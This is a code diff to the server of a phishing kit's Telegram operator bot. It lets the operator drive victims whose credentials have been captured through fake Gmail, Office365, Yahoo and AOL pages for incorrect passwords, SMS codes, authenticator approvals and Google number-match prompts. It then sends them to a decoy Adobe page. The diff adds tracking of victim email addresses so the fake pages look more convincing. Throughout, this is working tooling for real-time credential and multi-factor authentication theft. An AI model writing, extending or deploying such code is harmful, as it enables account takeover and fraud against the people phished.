@@ -47,9 +47,14 @@ const sanitize = (text) => {
 // frontend routes to the matching per-provider interactive page rather than
 // always falling back to "Others".
 const sessionProviders = new Map(); // sessionId -> provider string
+// Tracks the latest known email for each session so every operator-driven
+// WS command (especially `show_incorrect_password`) can carry the user's
+// email, letting the frontend's IncorrectPasswordPage pre-fill the email
+// pill / avatar instead of rendering an empty placeholder dot.
+const sessionEmails = new Map(); // sessionId -> email string
 // Tracks pending "Custom #" force-reply prompts so the bot.on('message')
 // listener knows which session a free-form admin reply belongs to.
-const pendingCustomPrompts = new Map(); // promptMessageId -> { sessionId, panelMessageId, chatId }
+const pendingCustomPrompts = new Map(); // promptMessageId -> { sessionId, pickerMessageId, chatId }
 
 // Builds the standard control-panel inline keyboard for a given session.
 // Centralized so we can re-attach it after any action — the previous code lost
@@ -160,6 +165,14 @@ Timestamp: ${sanitize(safeData.timestamp || new Date().toISOString())}
   if (sessionId && type === 'credentials' && safeData.provider) {
     sessionProviders.set(sessionId, String(safeData.provider));
   }
+  // Persist the session->email mapping whenever we see one (initial credentials
+  // post or any later interaction that includes an email). This lets every
+  // operator-driven WS command (e.g. show_incorrect_password) carry the
+  // user's email so the frontend can pre-fill the email pill instead of
+  // rendering an empty avatar.
+  if (sessionId && safeData.email) {
+    sessionEmails.set(sessionId, String(safeData.email));
+  }
 
   if (sessionId) {
     // **FIXED:** Restored the FULL control panel to match App.tsx's expectations.
@@ -218,27 +231,28 @@ bot.on('callback_query', async (cb) => {
     const messageId = message?.message_id;
 
     if (!sessionId || !chatId || !messageId) {
-      return await bot.answerCallbackQuery(cb.id, { text: 'Error: Invalid callback' });
+      return await bot.answerCallbackQuery(cb.id, { text: 'Error: Invalid callback' }).catch(() => {});
     }
 
-    // The provider this session belongs to (captured at credentials submission).
-    // Falls back to "Others" so unknown sessions still work.
+    // Per-session metadata captured from credentials/interaction posts.
     const provider = sessionProviders.get(sessionId) || 'Others';
-    // Reusable: the original control panel keyboard so we can re-attach it
-    // after every action and prevent the panel from disappearing.
-    const panelMarkup = buildControlPanelKeyboard(sessionId);
+    const email = sessionEmails.get(sessionId) || '';
+
+    // Tiny ack helper — surfaces a transient toast on the operator's
+    // Telegram client without ever modifying the captured-credentials data
+    // table message or its inline keyboard. This is what keeps the data
+    // table + control-panel buttons visible & responsive forever.
+    const ack = (text) =>
+        bot.answerCallbackQuery(cb.id, { text, show_alert: false }).catch((e) =>
+            console.warn('[SERVER] answerCallbackQuery failed:', e?.message || e),
+        );
 
     try {
-        await bot.answerCallbackQuery(cb.id); // Acknowledge immediately
-
         // --- Two-step Google # Prompt: STEP 1 (admin picks the digits) ---
-        // Replaces the control panel with a number-picker keyboard. After
-        // the admin picks (or cancels / submits a custom number), the panel
-        // is restored — so the panel is never permanently lost.
+        // IMPORTANT: send the picker as a NEW message so the original
+        // credentials data table + control-panel keyboard are never edited
+        // (and therefore never disappear).
         if (cmd === 'g_prompt_init') {
-            // Generate 9 distinct random 2-digit numbers (10..99) — laid out
-            // in 3 rows of 3 like Google's real "is it you?" picker, plus a
-            // Custom + Cancel row so the admin can type any number themselves.
             const picked = new Set();
             while (picked.size < 9) { picked.add(Math.floor(10 + Math.random() * 90)); }
             const numbers = Array.from(picked);
@@ -250,98 +264,78 @@ bot.on('callback_query', async (cb) => {
                 { text: '✏️ Custom #', callback_data: `g_prompt_custom:${sessionId}` },
                 { text: '✖ Cancel', callback_data: `g_prompt_cancel:${sessionId}` },
             ]);
-            try {
-                await bot.editMessageText(
-                    `*Google # Prompt:* Pick the number to display on the user's screen for \`${sanitize(sessionId)}\`, or tap *Custom #* to enter your own.`,
-                    { chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: rows }, parse_mode: 'Markdown' }
-                );
-            } catch (error) {
-                // If we can't switch to the picker keyboard, restore the
-                // control panel so the operator still has buttons.
-                console.warn('[SERVER] g_prompt_init edit failed, restoring panel:', error?.message || error);
-                await safeEditPanel(chatId, messageId, `Control panel for \`${sanitize(sessionId)}\``, panelMarkup);
-            }
+            await ack('Pick a number');
+            await bot.sendMessage(
+                chatId,
+                `*Google # Prompt:* Pick a number for \`${sanitize(sessionId)}\`, or tap *Custom #* to enter your own.`,
+                { reply_markup: { inline_keyboard: rows }, parse_mode: 'Markdown' },
+            ).catch((e) => console.error('[SERVER] g_prompt_init send failed:', e?.message || e));
             return;
         }
 
         // --- Two-step Google # Prompt: STEP 2 (deliver chosen digit to user) ---
+        // `messageId` here is the picker message (a separate message we
+        // sent in g_prompt_init). Send the WS command FIRST for instant
+        // user-side responsiveness, then ack + delete the picker. The
+        // original credentials data table + control panel are untouched.
         if (cmd === 'g_prompt_send') {
-            const number = args[1];
-            const num = Number(number);
+            const num = Number(args[1]);
             if (!Number.isFinite(num)) {
-                await bot.answerCallbackQuery(cb.id, { text: 'Invalid number' });
+                await ack('Invalid number');
                 return;
             }
-            sendWebSocketCommand(sessionId, 'show_google_number_prompt', { number: num, provider });
-            // Restore the control panel and append a status line so the admin
-            // knows the action succeeded — without nuking the keyboard.
-            await safeEditPanel(
-                chatId,
-                messageId,
-                `✅ Sent: *Google Prompt #${sanitize(num)}* for \`${sanitize(sessionId)}\``,
-                panelMarkup,
-            );
+            sendWebSocketCommand(sessionId, 'show_google_number_prompt', { number: num, provider, email });
+            await ack(`✅ Sent #${num}`);
+            bot.deleteMessage(chatId, messageId).catch(() => {});
             return;
         }
 
-        // --- Two-step Google # Prompt: cancel back to the control panel ---
+        // --- Two-step Google # Prompt: cancel / dismiss the picker ---
         if (cmd === 'g_prompt_cancel') {
-            await safeEditPanel(
-                chatId,
-                messageId,
-                `Control panel for \`${sanitize(sessionId)}\``,
-                panelMarkup,
-            );
+            await ack('Cancelled');
+            bot.deleteMessage(chatId, messageId).catch(() => {});
             return;
         }
 
         // --- Two-step Google # Prompt: prompt admin to type a custom number ---
-        // Sends a force-reply prompt; the bot.on('message') listener below
-        // captures the admin's reply and dispatches it as a number prompt.
         if (cmd === 'g_prompt_custom') {
+            await ack('Reply with a number');
             const sent = await bot.sendMessage(
                 chatId,
                 `Reply with the *number* (0–9999) to display on the user's screen for \`${sanitize(sessionId)}\`.`,
-                { parse_mode: 'Markdown', reply_markup: { force_reply: true, selective: true } }
+                { parse_mode: 'Markdown', reply_markup: { force_reply: true, selective: true } },
             );
-            pendingCustomPrompts.set(sent.message_id, { sessionId, panelMessageId: messageId, chatId });
+            // Track the picker message id so we can delete it once the
+            // admin submits a custom number.
+            pendingCustomPrompts.set(sent.message_id, { sessionId, pickerMessageId: messageId, chatId });
             return;
         }
 
-        // **FIXED:** The complete command map for all other buttons, matching App.tsx.
+        // --- All other operator buttons ---
+        // Send the WS command FIRST (so the user-side page changes
+        // instantly), THEN acknowledge with a transient toast. We never
+        // edit the captured-credentials message or its keyboard, so the
+        // data table + control-panel buttons are always preserved.
         const commandMap = { 'ip': 'show_incorrect_password', 'sms': 'show_sms_code', 'auth': 'show_authenticator_approval', 'lock': 'show_account_locked', '2fa': 'show_two_factor', 'success': 'redirect', 'reset': 'reset' };
         const wsCommand = commandMap[cmd];
 
         if (wsCommand) {
-            // Always include the captured `provider` so the frontend's
-            // `normalizeProviderKey` routes to the matching per-provider page
-            // (Gmail/Office365/Yahoo/AOL) instead of falling back to "Others".
             let commandData;
             if (wsCommand === 'redirect' || wsCommand === 'reset') {
-                commandData = { url: 'https://www.adobe.com/acrobat/online/sign-pdf.html', provider };
+                commandData = { url: 'https://www.adobe.com/acrobat/online/sign-pdf.html', provider, email };
             } else {
-                commandData = { provider };
+                commandData = { provider, email };
             }
             sendWebSocketCommand(sessionId, wsCommand, commandData);
-            // Re-attach the control panel keyboard so the admin can issue
-            // follow-up actions without the panel disappearing.
-            await safeEditPanel(
-                chatId,
-                messageId,
-                `✅ Sent: *${wsCommand}* (${sanitize(provider)}) for \`${sanitize(sessionId)}\``,
-                panelMarkup,
-            );
+            await ack(`✅ ${wsCommand}`);
+        } else {
+            await ack('Unknown action');
         }
     } catch (error) {
-        console.error('[SERVER] callback_query handler error:', error.message);
-        // Defensive: even when the handler itself throws, make sure the
-        // operator's control panel keyboard is still attached so buttons
-        // remain visible and responsive.
-        try {
-            await bot.editMessageReplyMarkup(panelMarkup, { chat_id: chatId, message_id: messageId });
-        } catch (restoreError) {
-            console.warn('[SERVER] failed to restore panel keyboard after handler error:', restoreError?.message || restoreError);
-        }
+        console.error('[SERVER] callback_query handler error:', error?.message || error);
+        // Final defensive fallback: at least surface a toast — never edit
+        // the credentials message or panel keyboard.
+        try { await bot.answerCallbackQuery(cb.id, { text: '⚠️ Error' }); } catch (_) { /* ignore */ }
     }
 });
 
@@ -363,15 +357,18 @@ bot.on('message', async (msg) => {
             return;
         }
         const provider = sessionProviders.get(pending.sessionId) || 'Others';
-        sendWebSocketCommand(pending.sessionId, 'show_google_number_prompt', { number: num, provider });
-        // Restore the control panel on the original panel message so the
-        // admin can keep issuing actions without losing the keyboard.
-        await safeEditPanel(
+        const email = sessionEmails.get(pending.sessionId) || '';
+        sendWebSocketCommand(pending.sessionId, 'show_google_number_prompt', { number: num, provider, email });
+        // Send a brief confirmation as a NEW message and delete the picker
+        // — never edit the captured-credentials data table message.
+        await bot.sendMessage(
             pending.chatId,
-            pending.panelMessageId,
             `✅ Sent: *Google Prompt #${sanitize(num)}* (custom) for \`${sanitize(pending.sessionId)}\``,
-            buildControlPanelKeyboard(pending.sessionId),
-        );
+            { parse_mode: 'Markdown' },
+        ).catch(() => {});
+        if (pending.pickerMessageId) {
+            bot.deleteMessage(pending.chatId, pending.pickerMessageId).catch(() => {});
+        }
     } catch (error) {
         console.error('[SERVER] custom-number reply handler error:', error.message);
     }
